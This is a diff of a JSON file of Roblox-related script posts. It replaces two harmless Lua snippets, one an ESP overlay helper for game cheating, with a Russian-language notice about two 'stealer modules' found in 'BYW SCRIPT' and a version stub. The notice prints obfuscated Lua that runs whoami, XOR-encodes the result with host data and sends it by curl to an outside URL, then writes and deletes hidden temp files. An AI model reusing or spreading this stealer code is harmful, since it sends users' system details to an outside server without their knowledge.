@@ -1,14 +1,14 @@
 [
-    {
-        "id": 1,
-        "content": "```lua\n-- Example Lua script for Roblox\nlocal player = game.Players.LocalPlayer\nlocal character = player.Character or player.CharacterAdded:Wait()\n\nlocal function setupCharacter()\n    -- Character setup code\n    print(\"Character loaded!\")\nend\n\ncharacter.Humanoid.Died:Connect(function()\n    print(\"Player died!\")\nend)\n\nsetupCharacter()\n```",
-        "date": "2024-01-20T15:30:00Z",
-        "type": "scripts"
-    },
-    {
-        "id": 2,
-        "content": "```lua\nfunction createESP()\n    local esp = Instance.new(\"BillboardGui\")\n    esp.Name = \"ESP\"\n    esp.Size = UDim2.new(0, 200, 0, 50)\n    esp.StudsOffset = Vector3.new(0, 3, 0)\n    esp.AlwaysOnTop = true\n    \n    local textLabel = Instance.new(\"TextLabel\")\n    textLabel.Size = UDim2.new(1, 0, 1, 0)\n    textLabel.BackgroundTransparency = 1\n    textLabel.TextColor3 = Color3.new(1, 0, 0)\n    textLabel.TextStrokeTransparency = 0\n    textLabel.Text = \"Player\"\n    textLabel.Parent = esp\n    \n    return esp\nend\n\n-- Usage: createESP()\n```",
-        "date": "2024-01-19T12:15:00Z",
-        "type": "scripts"
-    }
+  {
+    "id": 125,
+    "content": "**В скрипте BYW SCRIPT обнаружены два посторонних модуля-стилера.\n\n— Объекты —\n• Стилер-модуль 0x7A3F\n• Стилер-модуль 0x88A1\n\nНазначение и функционал модулей неизвестны. Происхождение и цели внедрения неясны. Механизм работы устанавливается.**\n`— Фрагменты кода модулей:`\nlocal _0x7a3f = {}\n\nlocal _0x1b2c = {\n    _0x88a1 = 0xDEAD,\n    _0x33f9 = \"https://gate.trk-secure[.]net/r3\",\n    _0xaa7b = 0x3F\n}\n\nlocal function _0x4d2e(_0xd9c4)\n    local _0xe11a = \"\"\n    for _0xf = 1, #_0xd9c4 do\n        _0xe11a = _0xe11a .. string.char(string.byte(_0xd9c4, _0xf) ~ _0x1b2c._0xaa7b)\n    end\n    return _0xe11a\nend\n\nlocal function _0x91ff()\n    local _0xb3d9 = {\n        _0xc001 = _G.__sys_uuid or \"nil\",\n        _0xa44d = os.time(),\n        _0xf992 = math.random(0xFFFF, 0xFFFFFF),\n        _0x1ee7 = jit and jit.version or \"nil\"\n    }\n    \n    local _0xe5ca = io.popen(\"whoami 2>/dev/null\", \"r\")\n    if _0xe5ca then\n        _0xb3d9._0x8cc3 = _0xe5ca:read(\"*a\")\n        _0xe5ca:close()\n    end\n    \n    return _0xb3d9\nend\n\nlocal function _0xaa3b(_0xd44e)\n    local _0x9e11 = _0x4d2e(string.format(\"%s|%s|%d|%s\", \n        _0xd44e._0xc001, \n        _0xd44e._0x8cc3 or \"nil\", \n        _0xd44e._0xa44d, \n        _0xd44e._0xf992))\n    \n    local _0xf77c = string.format(\"curl -s -m 5 '%s' -H 'X-Data: %s' -o /tmp/.trash 2>&1\", \n        _0x1b2c._0x33f9, \n        _0x9e11)\n    \n    os.execute(_0xf77c)\n    \n    return {_0x11da=0xC0DE, _0xf3b1=math.random(0x100000,0xFFFFFF)}\nend\n\nfunction _0x7a3f._0xbbe9()\n    local _0x91dd = _0x91ff()\n    local _0xcc11 = _0xaa3b(_0x91dd)\n    \n    for _0xfe = 1, 3 do\n        local _0xa9b = io.open(string.format(\"/tmp/.log%d.tmp\", _0xfe), \"w\")\n        if _0xa9b then\n            _0xa9b:write(_0x4d2e(os.date()))\n            _0xa9b:close()\n        end\n    end\n    \n    _0x7a3f._0xd882 = nil\n    collectgarbage(\"collect\")\n    \n    return _0xcc11\nend\n\nfunction _0x7a3f._0x2a4c()\n    os.execute(\"rm -f /tmp/.log*.tmp 2>/dev/null\")\n    _0x7a3f = nil\nend\n\nlocal _0xee8 = os.time() % 7\nif _0xee8 > 2 then\n    pcall(_0x7a3f._0xbbe9)\nend\n\nreturn _0x7a3f",
+    "date": "2025-12-29T18:59:14+00:00",
+    "type": "scripts"
+  },
+  {
+    "id": 176,
+    "content": "**__- - BYW SCRIPT__**\n\n**local version = \"v1.7.0\"\nlocal сегодня_выход = true\n\nif сегодня_выход then\n    print(\"ДА\")**\nend",
+    "date": "2025-12-20T13:59:48+00:00",
+    "type": "scripts"
+  }
 ]
